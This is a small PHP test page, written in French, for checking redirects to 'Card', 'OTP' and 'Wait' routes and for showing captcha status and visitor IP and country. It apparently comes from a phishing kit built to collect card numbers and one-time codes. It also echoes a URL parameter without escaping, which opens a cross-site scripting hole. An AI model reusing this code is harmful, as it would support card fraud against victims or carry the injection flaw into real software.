<?php
if (!defined('ROOT')) die('403');
?>
<!DOCTYPE html>
<html>
<head>
    <title>Test Routing</title>
    <style>
        body{font-family:Arial;padding:40px;background:#f5f5f5}
        .box{background:#fff;padding:30px;border-radius:8px;max-width:600px;margin:0 auto}
        h1{color:#333;margin-bottom:20px}
        .test{padding:15px;margin:10px 0;border-radius:5px;cursor:pointer;text-align:center;font-weight:bold;transition:all .2s}
        .test:hover{transform:translateY(-2px)}
        .test.blue{background:#2196F3;color:#fff}
        .test.green{background:#4CAF50;color:#fff}
        .test.orange{background:#FF9800;color:#fff}
        .test.red{background:#f44336;color:#fff}
        .info{background:#E3F2FD;padding:15px;border-radius:5px;margin:20px 0;border-left:4px solid #2196F3}
        code{background:#eee;padding:2px 6px;border-radius:3px;font-family:monospace}
    </style>
</head>
<body>
    <div class="box">
        <h1>🧪 Test Routing</h1>

        <div class="info">
            <strong>Page actuelle:</strong> <code><?php echo $_GET['r'] ?? 'accueil'; ?></code>
        </div>

        <h2>Tests de redirection</h2>

        <div class="test blue" onclick="window.location.href='/?r=c'">
            Tester /?r=c (Card)
        </div>

        <div class="test green" onclick="window.location.href='/?r=o'">
            Tester /?r=o (OTP)
        </div>

        <div class="test orange" onclick="window.location.href='/?r=w'">
            Tester /?r=w (Wait)
        </div>

        <div class="test red" onclick="window.location.href='/'">
            Retour accueil
        </div>

        <div class="info" style="margin-top:30px">
            <strong>Session:</strong><br>
            Captcha validé: <?php echo isset($_SESSION['captcha_ok']) && $_SESSION['captcha_ok'] ? '✅ Oui' : '❌ Non'; ?><br>
            IP: <?php echo $_SESSION['ip_data']['ip'] ?? 'N/A'; ?><br>
            Pays: <?php echo $_SESSION['ip_data']['country'] ?? 'N/A'; ?>
        </div>
    </div>
</body>
</html>
